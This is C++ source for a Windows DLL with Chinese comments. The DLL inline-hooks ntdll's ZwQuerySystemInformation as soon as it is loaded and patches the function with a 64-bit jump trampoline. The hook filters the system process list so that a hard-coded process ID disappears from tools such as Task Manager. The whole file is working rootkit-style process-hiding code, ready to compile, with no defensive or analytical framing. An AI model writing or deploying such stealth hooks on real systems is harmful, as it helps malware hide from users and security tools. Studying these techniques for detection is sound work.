
#include <Windows.h>
#include <Winternl.h>
BYTE g_OldData64[12] = { 0 };
typedef NTSTATUS(*typedef_ZwQuerySystemInformation)(
	SYSTEM_INFORMATION_CLASS SystemInformationClass,
	PVOID SystemInformation,
	ULONG SystemInformationLength,
	PULONG ReturnLength
	);
NTSTATUS New_ZwQuerySystemInformation(
	SYSTEM_INFORMATION_CLASS SystemInformationClass,
	PVOID SystemInformation,
	ULONG SystemInformationLength,
	PULONG ReturnLength
	);
void HookApi();
void UnhookApi();
/*typedef struct _SYSTEM_PROCESS_INFORMATION {
    ULONG NextEntryOffset; //下一个进程结构体的相对位置，用此结构体的地址加上NextEntryOffset就可以得到下一个结构体的地址
    ULONG NumberOfThreads;
    BYTE Reserved1[48];
    PVOID Reserved2[3];    //数组第二个就是进程名的字符串指针
    HANDLE UniqueProcessId;  //成员包含进程的唯一进程 ID。
    PVOID Reserved3;
    ULONG HandleCount;
    BYTE Reserved4[4];
    PVOID Reserved5[11];
    SIZE_T PeakPagefileUsage;
    SIZE_T PrivatePageCount;
    LARGE_INTEGER Reserved6[6];
} SYSTEM_PROCESS_INFORMATION,*PSYSTEM_PROCESS_INFORMATION;
*/
void HookApi()
{
	// 获取 ntdll.dll 的加载基址, 若没有则返回
	HMODULE hDll = ::GetModuleHandleW(L"ntdll.dll");
	// 获取 ZwQuerySystemInformation 函数地址
	typedef_ZwQuerySystemInformation ZwQuerySystemInformation = (typedef_ZwQuerySystemInformation)::GetProcAddress(hDll, "ZwQuerySystemInformation");
	// mov rax,0x1122334455667788---函数地址
	// jmp rax
	// 机器码是：
	//	48 b8 8877665544332211
	//	ff e0
	BYTE pData[12] = {0x48, 0xb8, 0, 0, 0, 0, 0, 0, 0, 0, 0xff, 0xe0};
	ULONGLONG ullOffset = (ULONGLONG)New_ZwQuerySystemInformation;
	::RtlCopyMemory(&pData[2], &ullOffset, sizeof(ullOffset));
	// 保存前 12 字节数据
	::RtlCopyMemory(g_OldData64, (void*)ZwQuerySystemInformation, sizeof(pData));
	// 设置页面的保护属性为 可读、可写、可执行
	DWORD dwOldProtect = 0;
	::VirtualProtect((void*)ZwQuerySystemInformation, sizeof(pData), PAGE_EXECUTE_READWRITE, &dwOldProtect);
	// 修改
	::RtlCopyMemory((void*)ZwQuerySystemInformation, pData, sizeof(pData));
	// 还原页面保护属性
	::VirtualProtect((void*)ZwQuerySystemInformation, sizeof(pData), dwOldProtect, &dwOldProtect);

}


void UnhookApi()
{
	// 获取 ntdll.dll 的加载基址, 若没有则返回
	HMODULE hDll = ::GetModuleHandleW(L"ntdll.dll");
	if (NULL == hDll)
	{
		return;
	}
	// 获取 ZwQuerySystemInformation 函数地址
	typedef_ZwQuerySystemInformation ZwQuerySystemInformation = (typedef_ZwQuerySystemInformation)::GetProcAddress(hDll, "ZwQuerySystemInformation");
	if (NULL == ZwQuerySystemInformation)
	{
		return;
	}
	// 设置页面的保护属性为 可读、可写、可执行
	DWORD dwOldProtect = 0;
	::VirtualProtect((void*)ZwQuerySystemInformation, 12, PAGE_EXECUTE_READWRITE, &dwOldProtect);

	// 64 位下还原前 12 字节
	// 还原
	::RtlCopyMemory((void*)ZwQuerySystemInformation, g_OldData64, sizeof(g_OldData64));

	// 还原页面保护属性
	::VirtualProtect((void*)ZwQuerySystemInformation, 12, dwOldProtect, &dwOldProtect);
}


NTSTATUS New_ZwQuerySystemInformation(
	SYSTEM_INFORMATION_CLASS SystemInformationClass,
	PVOID SystemInformation,
	ULONG SystemInformationLength,
	PULONG ReturnLength
	)
{
	NTSTATUS status = 0;
	PSYSTEM_PROCESS_INFORMATION pCur = NULL, pPrev = NULL;
	// 要隐藏的进程PID
	DWORD dwHideProcessId = 9348;

	// UNHOOK API
	UnhookApi();

	// 获取 ntdll.dll 的加载基址, 若没有则返回
	HMODULE hDll = ::GetModuleHandleW(L"ntdll.dll");
	if (NULL == hDll)
	{
		return status;
	}
	// 获取 ZwQuerySystemInformation 函数地址
	typedef_ZwQuerySystemInformation ZwQuerySystemInformation = (typedef_ZwQuerySystemInformation)::GetProcAddress(hDll, "ZwQuerySystemInformation");
	// 调用原函数 ZwQuerySystemInformation
	status = ZwQuerySystemInformation(SystemInformationClass, SystemInformation,
						SystemInformationLength, ReturnLength);
	if (NT_SUCCESS(status) && 5 == SystemInformationClass)
	{
		pCur = (PSYSTEM_PROCESS_INFORMATION)SystemInformation;
		while (TRUE)
		{
			// 判断是否是要隐藏的进程PID
			if ((void*)dwHideProcessId == pCur->UniqueProcessId)  //if (!lstrcmpi(pCur->ImageName.Buffer, L"test.exe"))
			{
				if (0 == pCur->NextEntryOffset)
				{
					pPrev->NextEntryOffset = 0;
				}
				else
				{
					pPrev->NextEntryOffset = pPrev->NextEntryOffset + pCur->NextEntryOffset;
				}
			}
			else
			{
				pPrev = pCur;
			}

			if (0 == pCur->NextEntryOffset)
			{
				break;
			}
			pCur = (PSYSTEM_PROCESS_INFORMATION)((BYTE *)pCur + pCur->NextEntryOffset);
		}
	}

	// HOOK API
	HookApi();

	return status;
}

HMODULE g_hModule ;
BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
					 )
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
	{
		HookApi();
		//g_hModule = hModule;
		break;
	}
	case DLL_THREAD_ATTACH:
	{
		break;
	}
	case DLL_THREAD_DETACH:
	{
		break;
	}
	case DLL_PROCESS_DETACH:
	{
		UnhookApi();
		break;
	}
	default:
		break;
	}
	return TRUE;
}
